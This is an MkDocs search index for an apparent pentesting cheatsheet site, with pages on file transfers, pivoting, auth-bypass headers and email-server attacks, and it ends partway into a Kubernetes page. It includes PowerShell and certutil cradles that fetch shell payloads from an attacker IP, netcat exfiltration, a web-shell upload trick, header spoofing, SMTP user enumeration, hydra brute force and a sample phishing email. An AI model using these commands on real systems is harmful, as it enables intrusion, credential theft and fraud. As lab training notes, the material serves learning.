{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"#test-edit","title":"Test Edit","text":"<p>This is a test edit</p> <p>So is this...</p>"},{"location":"#testing-testing-123","title":"Testing Testing 1,2,3","text":""},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/","title":"File Transfers 101","text":"<p>There is more than one way to skin a cat, and there is more than one way to transfer a file.</p> <p>Just because one method doesn't work, doens't mean another one won't.</p> <p>Try Harder\u2122</p>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#hasing-and-verifying-files","title":"Hasing and Verifying Files","text":"<p>Before you transfer a file, it's always best to know what it is you're actually transferring, mostly so you'll know if it gets corrupted during the transfer. But also becuse reading files in a terminal makes you feel like a proper hacker.</p> <pre><code># Read a file\ncat /path/to/file\n\n# Read the file headers\nxxd /path/to/file | head -c 1024\n\n# Have Linux guess at the file type (from the file header)\nfile /path/to/file\n\n# Get a SHA256 hash\nsha265sum /path/to/file\n\n# Get an MD5 hash\nmd5sum /path/to/file\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#one-file-many-files","title":"One file &gt; Many files","text":"<p>If it's possible, archive whatever it is you need to upload/download.</p> <p>Sometimes it's not really feasible but it's something that should be considered, for multiple reasons.</p> <ul> <li>It's a smaller file</li> <li>It won't match any stored file hashes if your adversary uses such monitoring</li> <li>One file is easier to transfer than 10</li> <li>You can serialize the contents of an archive for text based extraction if that's all you have</li> </ul> <pre><code># Create a new tarball\ntar czvf NameOfTarBall.tgz /path/to/archive\n\n# Extract tarball\ntar xvf NameOfTarBall.tgz\n\n# Serialize a tarball\ncat NameOfTarBall.tgz | base64 -w 0\n\n# Recover tarball from serialized data\necho \"&lt;BASE64_STRING&gt;\" | base64 -d &gt; recovered.tgz\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#bash-command-line-tools","title":"BASH (command line tools)","text":"<pre><code>wget &lt;path to file&gt; -O &lt;filename&gt;\ncurl &lt;path to file&gt; --output &lt;filename&gt;\n\n# Copy a file from a target to our host\nscp user@host:/path/to/file /path/to/destination\n\n# Copy a file from our host to a target\nscp /path/to/file user@host:/path/to/destination\n\n# Copy a whole directory from our host to a target\nscp -r /path/to/directory user@host:/path/to/destination\n\n</code></pre> <p>We can use a netcat listener and STDOUT to write raw input to files:</p> <pre><code># setup a listener where \"someFile\" is the file you want to write\n# this will sit and wait for the connection, so set it up first\nnc -lvnp 1337 &gt; someFile\n\n# On the target\nnc 10.10.14.4 1337 &lt; someFile\n</code></pre> <p>You'll have no real way to tell when the transfer is done using the above <code>nc</code> method, so don't hit Ctrl-C until you're sure that everything copied across, and be sure to check the file size and run <code>file</code> and/or <code>sha256sum</code> to verify the integrity of the file (it can get trashed using this method)</p>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#ftp","title":"FTP","text":""},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#connect","title":"Connect","text":"<pre><code>ftp domain.com\nftp 192.168.0.1\nftp user@ftpdomain.com\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#log-in","title":"Log in","text":"<pre><code>Name: anonymous\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt;\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#move-around","title":"Move around","text":"<pre><code>ftp&gt; ls\nftp&gt; cd directory\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#grab-files","title":"Grab files","text":"<pre><code>get file\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#send-files","title":"Send files","text":"<pre><code>put file\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#python","title":"Python","text":""},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#with-requests","title":"With Requests","text":"<p><code>pip install requests</code></p> <pre><code>import requests\n\nurl = 'https://www.python.org/static/img/python-logo@2x.png'\nmyfile = requests.get(url)\nopen('/path/to/save/image.png', 'wb').write(myfile.content)\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#with-wget","title":"With wget","text":"<p><code>pip install wget</code></p> <pre><code>import wget\n\nurl = \"https://www.python.org/static/img/python-logo@2x.png\"\nwget.download(url, '/path/to/save/image.png')\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#with-urllib","title":"With urllib","text":"<p>should already be installed, but... <code>pip install urllib</code></p> <pre><code>urllib.request.urlretrieve('url', 'path')\n</code></pre> <p>With urllib3</p> <p><code>pip install urllib3</code></p> <pre><code>import urllib3, shutil\n\nurl = 'https://www.python.org/'\nc = urllib3.PoolManager()\nfilename = \"test.txt\"\nwith c.request('GET', url, preload_content=False) as res, open(filename, 'wb') as out_file:\n    shutil.copyfileobj(res, out_file)\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#powershell","title":"Powershell","text":"<p>In-memory download cradle handy for pentesting as nothing gets written to disk so there is less chance of triggering a related alert</p> <pre><code>IEX(New-Object Net.WebClient)downloadString('http://10.10.14.4/shell.ps1')\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#standard-web-request","title":"Standard Web Request","text":"<pre><code>iwr \u2018http://10.10.14.4/shell.ps1\u2019 -Outfile C:\\Windows\\temp\\shell.ps1\n\nInvoke-WebRequest -Url http://10.10.14.4/shell.ps1 -Outfile C:\\Windows\\temp\\shell.ps1\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#smb","title":"SMB","text":""},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#standard-smb","title":"Standard SMB","text":"<ol> <li>Modify /etc/samba/smbd.conf. Add the following to the bottom:</li> </ol> <pre><code>[global]\nworkgroup = WORKGROUP\nserver string = Samba Server %v\nnetbios name = tengu\nsecurity = user\nmap to guest = bad user\nname resolve order = bcast host\ndns proxy = no\nbind interfaces only = yes\n\n[gorilla]\npath = /var/www/html/pub\nwritable = no\nguest ok = yes\nguest only = yes\nread only = yes\ndirectory mode = 0555\nforce user = nobody\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#set-folder-permissions","title":"Set folder permissions","text":"<pre><code>chmod 0555 /var/www/html/pub\nchown -R nobody:nogroup /var/www/html/pub\n\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#restart-samba","title":"Restart Samba","text":"<pre><code>service smbd start\nservice smdb stop\nservice smbd restart\n\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#monitor-logs-for-errors","title":"Monitor logs for errors","text":"<pre><code>tail -f /var/log/samba/log.&lt;site-name&gt;\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#impacket-smb","title":"Impacket SMB","text":"<pre><code>impacket-smbserver -ip 10.10.14.4 -smb2support bullsec /var/www/html/pub\n</code></pre> <p>Then use <code>\\\\10.10.14.4\\bullsec\\&lt;file-name&gt;</code> as the location to send your file from, or to have the target grab from you.</p> <p>Mounting a remote share is pretty simple as well assuming you know the name of the share:</p> <pre><code>mkdir /mnt/10.10.10.123\nmount -t cifs //10.10.10.123/general /mnt/10.10.10.123\n\n</code></pre> <p>Now we can browse the share inside our terminal.</p>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#impacket-smb-w-password","title":"Impacket SMB w/ Password","text":"<pre><code># Create the SMB Share\nimpacket-smbserver bullShare $(pwd) -smb2support -user bullsec -password SecurePassword\n</code></pre> <pre><code># Create a Credential Object\n$pass = convertto-securestring 'SecurePassword' -asplain -force\n$cred = new-object system.management.automation.pscredential(\"htb\\bullsec\", $pass)\n</code></pre> <pre><code># Connect to the Share\nNew-PSDrive -Name bullsec -PSProvider FileSystem -Credential $cred -Root \\\\10.10.14.3\\bullShare\n</code></pre> <pre><code># Browse the Share\ncd bullShare:\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#certutil","title":"certutil","text":"<p>Genuinely forget that this is a thing most of the time but it's such a useful tool. If you're on a Windows machine then this may be a viable option for transferring files from our host system to the target:</p> <pre><code>certutil -urlcache -f \u201chttp://10.10.14.14/shell.exe\u201d shell.exe\n</code></pre> <p>That's it really.</p> <p>It might not always be a thing, but on older Windows machines it should be present.</p>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#tftp","title":"TFTP","text":"<p>Trivial File Transfer Protocol is a nice way to get around file transfers on Windows assuming it's installed on the sytem. It's basically FTP but it runs on UDP instead of TCP.</p> <pre><code>service atftpd start\n</code></pre> <p>On Kali by default TFTP is configured from the following location:</p> <p><code>/etc/default/atftpd</code></p> <p>And it serves files (by default) from:</p> <p><code>/srv/tftp</code></p> <p>To download files from a server we can do:</p> <pre><code>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server\n</code></pre> <p>And to upload a file to the server we can do:</p> <pre><code>tftp -i host PUT C:%homepath%file location_of_file_on_tftp_server\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#sftp","title":"SFTP","text":"<p>How To Use SFTP to Securely Transfer Files with a Remote Server</p>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#visualbasic","title":"VisualBasic","text":"<p>If push comes to shove, we can use something like the following:</p> <pre><code>Set args = Wscript.Arguments \nUrl = \"http://domain/file\" dim xHttp: \nSet xHttp = createobject(\"Microsoft.XMLHTTP\") dim bStrm: \nSet bStrm = createobject(\"Adodb.Stream\") \nxHttp.Open \"GET\", Url, False xHttp.Send with bStrm     \n.type = 1 '     \n.open     \n.write xHttp.responseBody     \n.savetofile \" C:%homepath%file\", 2 ' end with\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-file-transfers-101/#webdav","title":"WebDAV","text":"<p>We can sometimes use WebDAV to upload files to a system.</p> <p>If it's enabled use a tool like cadaver to PUT a file onto the server, usually there are some restrictions on file uploads/execution, bu it doesn't recheck the file after the initial upload, so just use the mv command to change the extension.</p> <pre><code>$&gt; cadaver http://192.168.56.5\n\nput shell.jsp.txt\nmv shell.jsp.txt shell.jsp\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/","title":"Pivoting &amp; Lateral Movement","text":"<p>Sometimes we just can't get access to the thing that we need to exploit.</p> <p>When that happens we need to know the different ways in which we can get around this little hurdle, as there is always a way.</p> <p>The question on StackExchange that spawned this post</p>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#socat","title":"SOCAT","text":"<pre><code>socat tcp-listen:8001,reuseaddr,fork tcp:localhost:8000\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#python","title":"Python","text":"<p>Not something you want to code yourself with any kind of time contraints, but it's totally possible.</p> <p>Best choice is to use an existing library like sshtunnel which you can use to do things like the following (which forwards a Vagrant server to the local MySQL port):</p> <pre><code>from sshtunnel import open_tunnel\nfrom time import sleep\n\nwith open_tunnel(\n    ('localhost', 2222),\n    ssh_username=\"vagrant\",\n    ssh_password=\"vagrant\",\n    remote_bind_address=('127.0.0.1', 3306)\n) as server:\n\n    print(server.local_bind_port)\n    while True:\n        # press Ctrl-C for stopping\n        sleep(1)\n\nprint('FINISH!')\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#putty","title":"Putty","text":"<p>Basically SSH for Windows. Usually the most interaction we'll have with this is when we find one of it's keys (.ppk) laying around on a machine.</p> <p>With that being said...</p> <p>Convert Putty key to SSH key:</p> <pre><code>puttygen id_dsa.ppk -O private-openssh -o id_dsa\n\nputtygen id_dsa.ppk -O public-openssh -o id_dsa.pub\n</code></pre> <p>Sometimes Putty also has passwords left in the registry:</p>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#plink","title":"Plink","text":"<p>For this to work we need to make sure SSH is turned on. </p> <pre><code>service ssh restart\n</code></pre> <p>The on the target machine we can do the following:</p> <pre><code>.\\plink.exe root@kali_ip -R KALI_PORT:IP_OF_TARGET_MACHINE:TARGET_PORT\n</code></pre> <p>(Could come in handy if we have SMB creds for an admin but we can't access SMB remotely)</p>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#metasploit","title":"Metasploit","text":"<p>In a <code>meterpreter</code> session:</p> <pre><code>portfwd add -l LOCAL_PORT -p DESTINATION_PORT -r TARGET_IP\n</code></pre> <pre><code>run autoroute -s 10.1.1.0/24\nrun autoroute -s 10.2.2.0/24\n</code></pre> <pre><code>use auxiliary/server/socks4a\nset SRVHOST 127.0.0.1\nexploit -j\n\n</code></pre> <p>Now on our host machine we can scan the IT network:</p> <pre><code>vim /etc/proxychains.conf \n...\nsocks4 127.0.0.1 1080\n</code></pre> <pre><code>proxychains nmap -sT -v -Pn 10.2.2.224\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#chisel","title":"Chisel","text":"<p>Chisel is an awesome tool that is more than capable of turning what feels like a lost cause into a system own.</p> <p>Github Link for Chisel</p> <p>On the host:</p> <pre><code>chisel(.exe) client 10.10.14.3:1338 R:1234:127.0.0.1:1234\n</code></pre> <p>That will setup a connection to 1337, which will then forward port 1234 to localhost:</p> <pre><code>chisel(.exe) server -p 1337 -reverse -v\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#ssh","title":"SSH","text":"<p>Local Foward:</p> <pre><code>ssh -L 80:127.0.0.1:80 someserver@someip\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#remote-forward","title":"Remote Forward","text":"<pre><code>ssh -R 8080:localhost:80 someserver@someip\n</code></pre>"},{"location":"Cheatsheets/General/2022-07-30-pivot-101/#dynamic-tunneling","title":"Dynamic tunneling","text":"<pre><code>ssh -D 9000 sean@10.11.1.251\n</code></pre> <pre><code>vim /etc/proxychains.conf \n\nsocks4 127.0.0.1 1080\n</code></pre> <pre><code>proxychains nmap -sT -v -Pn 10.2.2.224\n</code></pre> <p>This creates a dynamic tunnel over port 9000 using SOCKS(4a)</p>"},{"location":"Cheatsheets/General/2022-08-07-auth-bypass-headers/","title":"Auth Bypass Headers\"","text":"<p>Adapted from this tweet:</p> <p>I have found multiple auth bypass issues using below Headers#bugbountytips #bugbounty pic.twitter.com/R82TXWiyDX</p>\u2014 \u00af\\_(\u30c4)_/\u00af85 (@BountyOverflow) August 6, 2022 <p>The following headers can potentially be used to bypass authentication on a webserver.</p> <ul> <li>X-Forwarded: 127.0.0.1</li> <li>X-Forwarded-By: 127.0.0.1</li> <li>X-Forwarded-For: 127.0.0.1</li> <li>X-Forwarded-For-Original: 127.0.0.1</li> <li>X-Forwarder-For: 127.0.0.1</li> <li>X-Forward-For: 127.0.0.1</li> <li>Forwarded-For: 127.0.0.1</li> <li>Forwarded-For-Ip: 127.0.0.1</li> <li>X-Custom-IP-Authorization: 127.0.0.1</li> <li>X-Originating-Ip: 127.0.0.1</li> <li>X-Remote-IP: 127.0.0.1</li> <li>X-Remote-Addr: 127.0.0.1</li> <li>X-Trusted-IP: 127.0.0.1</li> <li>X-Requested-By: 127.0.0.1</li> <li>X-Requested-For: 127.0.0.1</li> </ul>"},{"location":"Cheatsheets/General/2022-08-07-auth-bypass-headers/#example-usage","title":"Example Usage","text":"<p>Scenario: You try to access <code>/login</code> and get a custom <code>401</code> response that says something like:</p> <p><code>IP not on Whitelist!</code></p> <p>(not a likely response but serves as an example)</p> <p>You'd then try and send the following request:</p> <pre><code>GET /login HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)\nHost: bullsec.xyz\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nConnection: Keep-Alive\nX-Forwarded-For: 127.0.0.1\n</code></pre> <p>That endpoint doesn't exist on this site this is not a lab. {: .prompt-warning}</p> <p>The idea is that the webserver will parse the <code>X-Forwarded-For</code> header and assume that the request has been forwarded to it on behalf of <code>127.0.0.1</code> / <code>localhost</code> and let you access the \"Blocked\" <code>/login</code> endpoint. </p>"},{"location":"Cheatsheets/General/2022-08-07-auth-bypass-headers/#automation-block","title":"Automation Block","text":"<pre><code>X-Forwarded: 127.0.0.1\nX-Forwarded-By: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Forwarded-For-Original: 127.0.0.1\nX-Forwarder-For: 127.0.0.1\nX-Forward-For: 127.0.0.1\nForwarded-For: 127.0.0.1\nForwarded-For-Ip: 127.0.0.1\nX-Custom-IP-Authorization: 127.0.0.1\nX-Originating-Ip: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-Trusted-IP: 127.0.0.1\nX-Requested-By: 127.0.0.1\nX-Requested-For: 127.0.0.1\n</code></pre> <p>Copy the above into a text file</p> <pre><code>TARGET=&lt;target-ip-address&gt;\nfor x in $(cat headers.txt);do curl -v $TARGET -H \"$x\" ; done\n</code></pre> <p>That's your lot.</p> <p>Enjoy,</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/","title":"Email Pentesting","text":"<p>Email servers are complex beasts, if you've ever tried to configure one then you'll know the pain they can cause. With this in mind it's quite common to find them misconfigured in some way that we can take advantage of.</p> <p>For the purpose of this we'll make use of the following clipped <code>nmap</code> scan of an email server from HackTheBox as our reference point as it looks to be a pretty typical example of what you might find in the wild or on a corporate network.</p> <pre><code>22/tcp    open     ssh            syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n25/tcp    open     smtp           syn-ack ttl 63 Postfix smtpd\n80/tcp    open     http           syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))\n110/tcp   open     pop3           syn-ack ttl 63 Dovecot pop3d\n143/tcp   open     imap           syn-ack ttl 63 Dovecot imapd (Ubuntu)\n993/tcp   open     ssl/imap       syn-ack ttl 63 Dovecot imapd (Ubuntu)\n995/tcp   open     ssl/pop3       syn-ack ttl 63 Dovecot pop3d\n</code></pre> <p>This will be explained in greater detail below, but the above example is a fairly standard mail server, you've got your SMTP daemon (Postfix) running to send mails, and you've also got something to retreive the mails, in this case we have Dovecot running both POP3 and IMAP daemons in SSL and non-SSL mode (that's 4 separate services for the purposes of enumeration). And your common or garden SSH port running on 22, just for completeness, which is generally how the administrator will access this machine.</p> <p>Take your time with email servers, aside from all the information they can give us there can often be vulnerabilities in the services themselves which can be exploited by interacting with them. Make sure to grab proper versions where possible to help with further enumeration. {: .prompt-info }</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#understanding-email","title":"Understanding Email","text":"<p>Before we can attack something we need to at least have an understanding of what it is.</p> <p>Email, or electronic mail is a terrible form of communication favoured by managers and the guy in the office who refuses to join Slack because it doesn't fit into his \"Workflow\". But it can still be useful for phishing and otherwise abusing to gain access to systems.</p> <p>Mail is a simple thing, you send mails to a server and someone uses a client to access those emails. In the case of Outlook or something like that they are constantly polling the server and will download new mails when they arrive directly to your local machine, otherwise it would be a manual process (remember having to hit \"Send/Receive\" to get Outlook to send your mail back in the day?)</p> <p>There are a few protocols we need to be familiar with to be able to properly interact with the email server.</p> <p>*We use <code>telnet</code> as it seems to handle the process a bit better than <code>nc</code>, though <code>nc</code> can do the job {: .prompt-info }</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#pop3","title":"POP3","text":"<p>The \"Post Office Protocol\", or POP3 as it's generally called. As the name might suggest this is the protocol responsible for actually delivering the mails to users. POP3 servers communicate with the other mail protocols and essentially serve as your mailbox, you can log into the POP3 server (typically running on 110, and 995 in the SSL instance) and download your mail to your local machine or just view it on the server.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#imap","title":"IMAP","text":"<p>Another way of retreiving your mail, but it's much more suited to a larger environment as it handles multiple clients accessing the service simultaneously.</p> <p>By default IMAP runs on ports 143 and 993 respective of if it's using SSL or not with the latter (995) being the one running on SSL. IMAP is the most common protocol for mail access alongside POP3.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#smtp","title":"SMTP","text":"<p>Simple Mail Transport Protocol, or SMTP is the defacto standard for sending emails. And it's what we'll be using for most of our testing as we can interact with the protocol via <code>telnet</code>* from our Kali machine.</p> <p>Typically SMTP runs on port 25, with the secure version running on port 465 by default.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#stmp-command-cheat-sheet","title":"STMP Command Cheat Sheet","text":"Command Description <code>HELO</code> Basic server greeting (older systems) <code>ELHO</code> Enhanced server greeting (newer systems) <code>MAIL FROM</code> Who the mail is from (can be easily spoofed) <code>RCPT TO</code> Who to send the mail to? user@email.address <code>SIZE</code> Because size matters <code>DATA</code> The actual body/content of the message we want to send <code>VRFY</code> Verify that there is a valid user to receive an email (useful!) <code>TURN</code> Invert the client/server relationship without spawning a new connection <code>AUTH</code> For when we need to actually log in <code>RSET</code> Essentially a \"Cancel\" button, closes current action without terminating connection <code>HELP</code> DON'T PANIC! <code>QUIT</code> Because this has all just become a bit too much"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#pop3-command-cheat-sheet","title":"POP3 Command Cheat Sheet","text":"<pre><code>USER &lt;username&gt;\nPASS &lt;password&gt;\nSTAT\nLIST\nRETR\nDELE\nRSET\nTOP\nQUIT\n</code></pre> <p>POP3 is a simple beast and will only ever reply in one of the following ways:</p> <pre><code>+OK\n-ERR\n</code></pre>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#sending-emails","title":"Sending Emails","text":"<p>Before we can start hacking email servers we need to know the basic protocol for sending and interacting with them.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#sending-someone-a-mail-smtp","title":"Sending Someone a Mail SMTP","text":"<pre><code>$&gt; telnet 10.10.10.110 110\n&lt;SERVER BANNER GOES HERE&gt;\n&lt;Probably something about the creator&gt;\n&gt; HELO hacker@fakedomain.com\nOK\n&gt; MAIL FROM: hacker@fakedomain.com\nOK\n&gt; RCPT TO: someone@gullible.com\nOK\n&gt; DATA\n&lt;A message about how to end the mail, usually a \".\" on its own line&gt;\n\nDear Mr Guillible,\n\nWe are writing to you today as our records show that you are known to respond to random unsolicited emails asking to hand over your information. Could you kindly send us you 16 digit card number and the 3 digit security code off the back of the credit card with the most money on it to the following email address:\n\nstealing@allthethings.com\n\n.\n\n&lt;Confirmation message&gt;\n&gt; QUIT\n&lt;closing connection&gt;\n\n$&gt;\n</code></pre>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#reading-someones-mail-pop3","title":"Reading Someones Mail POP3","text":"<pre><code>$&gt; telnet 10.10.10.110 25\n&lt;SERVER BANNER GOES HERE&gt;\n&lt;Probably something about the creator&gt;\nUSER someusername\n+OK\nPASS somepassword\n+OK Mailbox open, 200 messages\nLIST\n+OK Mailbox scan listing follows\n1 1823\n2 1825\n3 1819\nRETR 1\n+OK 1823 octets\n--- MESSAGE CONTENT GOES HERE ---\n</code></pre>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#harvesting-users","title":"Harvesting Users","text":"<p>The biggest problem you're going to have with testing an email server is figuring out who to target. The best place to get that sort of information would be the company website or ideally dump their entire AD listing of active users... but since we probably don't have access to the latter we'll have to make do with the former and try and scrape as much information as we can from a website or FTP server, or whatever else we can get our grubby paws on.</p> <p>This writeup isn't supposed to be an OSINT primer, but that's kind of where you should be looking for more information on how to gather the kind of information that would be useful for this (emails and Names)</p> <p>As well as names of potential people, we can also look at potential names for departments or teams as these will often have a shared mailbox even in small organisations.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#mutations","title":"Mutations","text":"<p>Again this isn't what we're really here to discuss, but one of the things you need to bear in mind is all the potential ways a persons name could end up as a username. Take the simple and common English name David Smith as an example.</p> <pre><code>davidsmith\ndavid.smith\ndsmith\nd.smith\nsmithd\nsmith.d\nsmith.david\nsmithdavid\n</code></pre> <p>That's one simple name and I've not even covered all of the possible mutations, we've not even covered the case if there are multiple people with that name, do they get numbers? There is no simple answer here unfortunately, although a pretty good one to test early is <code>david.smith</code> as that seems to be a pretty common one in most enterprises I've seen.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#useful-tools","title":"Useful Tools","text":"<ul> <li>Your eyes (Voted #1 Most Useful Tool 2021)</li> <li>Screenshot tools like <code>eyewitness</code></li> <li><code>cewl</code> for scraping all of the words from a site/page</li> <li>My Password Generation CheatSheet could also be useful for generating mutations and otherwise creating unique wordlists to test</li> </ul>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#username-enumeration","title":"Username Enumeration","text":"<p>Now we have an idea how what the usernames might look like and how we might go about harvesting them from the email server we can think about how to verify our findings. And we don't have to think too hard before we say \"sod it\" and write a Python script to do all the leg work for us.</p> <pre><code>#!/usr/bin/python\n\nimport socket \nimport sys\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nip = sys.argv[1]\ninput_file = sys.argv[2]\n\nconnect = s.connect((ip,25))\nbanner = s.recv(1024)\nprint(banner)\n\nwith open(input_file) as payloads:\n        for p in payloads:\n                s.send(\"VRFY \" + p.rstrip() + '\\r\\n')\n                result = s.recv(1024)\n                print(result)\n\ns.close()\n</code></pre> <p>Give that bad boy a file with usernames and it will test them against the server using the very useful <code>VRFY</code> command. If the server isn't setup to respond to the <code>VRFY</code> command then it'll just fail and this isn't an option for you on this machine sadly, and it's likely that you're going to need to find credentials elsewhere.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#bruteforce","title":"Bruteforce","text":"<p>When in doubt, get the sledgehammer out.</p> <p>Or in our case <code>hydra</code>:</p> <pre><code>hydra -L userlist.txt -P passlist.txt -f $ip pop3 -V\n</code></pre> <p>One thing to try here is to use the userlist.txt as the passlist.txt as resetting a users password to their name can be quite a common fallback for some service desks {: .prompt-info }</p> <p>Bruteforcing could take forever or it could be fast depending on the lists you've used. Patience is key and making sure you've done the <code>VRFY</code> step (if it was possible) to check that you're attacking valid users.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#practical-exploitation","title":"Practical Exploitation","text":"<p>Once you've got your target list and you've gained some access, it's on you to figure out how to abuse those new permissions. But here are some ideas in case you were struggling:</p> <ul> <li>Send the admins/users generic phishing emails</li> <li>Send mails to user groups</li> <li>Read peoples mails and look for passwords</li> <li>Abuse the mail and just troll people (don't do this)</li> <li>Poison emails with malicious payloads that fire when they land</li> </ul> <p>Unless the mail server itself is vulnerable then you're essentially just looking at using the server to gain addtional information and potentially credentials to access other services.</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#postfix-disclaimer","title":"PostFix Disclaimer","text":"<p>No this is nothing to do with me warning you about using Postfix. It's got more to do with:</p> <p><code>/etc/postfix/disclaimer</code></p> <p>A harmless sounding file, right? What could be dangerous about a disclaimer? But then why would I be highlighting it in a pentesting guide if it wasn't worth mentioning?</p> <p>The <code>/etc/postfix/disclaimer</code> file is actually a BASH script that is sent along with every message. If for some reason we're able to modify that file then we'll be able to spawn a shell as whichever user is running the mail server simply by placing one at the top of the file under the shebang and setting up our listener accordingly.</p> <p>ExploitDB Link Explaining in Better Detail {: .prompt-info }</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#status-codes","title":"Status Codes","text":"<p>When you send a command to the server it will respond with a Status Code followed by some message relating to whatever it is you just asked the server to do.</p> <p>SMTP Status Code Lookup</p>"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#conclusions","title":"Conclusions","text":"<p>Email is bad.</p> <p>Email servers are fun.</p> <p>Happy hacking.</p>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/","title":"Pentesting Kubernetes","text":"<p>Useful Links:</p> <ul> <li>Risky Permissions</li> <li>Guide: Part 1</li> <li>Guide: Part 2</li> <li>Guide: Part 3</li> <li>OpenShift Pentesting</li> </ul>"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#kubernetes-outline","title":"Kubernetes Outline","text":"<p>Kubernetes or k8s is a \"container\" orchestration platform, designed to automate deployment, scaling and management of containerized applications (Docker images and such)</p> <p>There are two main parts to the k8s architecture:</p> <ol> <li>Master Node</li> <li>Worker Node</li> </ol> <p>A cluster is made up of a Master node and N Worker nodes.</p> <p>The job of the Master node is to act as a command and control (c2) server for the cluster and provide a control for all of the worker nodes. The Master node has many different containers running on it, but the main one of interest is the <code>kube-apiserver</code> which as it's name suggests, is the API server that k8s uses to orchestrate the cluster.</p> <p>All the traffic in the cluster is passed through this container. It also exposes an API that allows communication using a client (kubectl or customized one)</p> <p>The kube-apiserver is the only container that communicates with the etcd, which is the database of the cluster and contains all the sensitive data (tokens, passwords, etc.)</p> <p>That bit is important for our upcoming testing as it will mostly be the goal to be able to gain access to this API so that we can do things we're not supposed to be able to do.</p> <p></p> <p>On the worker nodes, the primary agent is the kubelet. It receives instructions from the kube-apisever and is responsible for executing the instruction such as deploying pods, which are logical groups of one or more containers, or downloading the image for the containers.</p> <p>There are two main \"users\" of a k8s cluster:</p> <ul> <li>Human users</li> <li>Service accounts</li> </ul> <p>Human users are exactly that, humans that are using the system. Service accounts are accounts that are configured for a particular pod 